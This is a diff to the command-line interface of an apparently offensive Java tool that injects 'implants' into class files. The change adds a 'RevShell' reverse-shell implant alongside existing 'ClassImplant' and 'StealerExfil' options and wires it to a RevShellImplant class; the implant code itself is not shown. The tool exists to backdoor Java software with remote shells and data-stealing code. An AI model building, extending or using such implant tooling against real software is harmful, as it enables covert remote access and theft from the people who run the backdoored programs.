@@ -14,8 +14,8 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.*;
-import java.util.logging.Formatter;
 import java.util.logging.*;
+import java.util.logging.Formatter;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -78,7 +78,7 @@ public class Cli {
                 .required(false);
         classInjectorParser.addArgument("-i", "--implant-class")
                 .help("Name of the class containing a custom 'init()' method and other implant logic.")
-                .choices("ClassImplant", "StealerExfil")
+                .choices("ClassImplant", "RevShell", "StealerExfil")
                 .setDefault("ClassImplant");
         classInjectorParser.addArgument("-c", "--config")
                 .help("Override one or more configuration properties inside the implant.")
@@ -213,6 +213,12 @@ public class Cli {
         if (implantClassName.equals("ClassImplant")) {
             try {
                 implantHandler = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
+            } catch (ClassNotFoundException | IOException | ImplantException e) {
+                throw new RuntimeException("Cannot find built-in implant class.", e);
+            }
+        } else if (implantClassName.equals("RevShell")) {
+            try {
+                implantHandler = ImplantHandlerImpl.findAndCreateFor(RevShellImplant.class);
             } catch (ClassNotFoundException | IOException | ImplantException e) {
                 throw new RuntimeException("Cannot find built-in implant class.", e);
             }
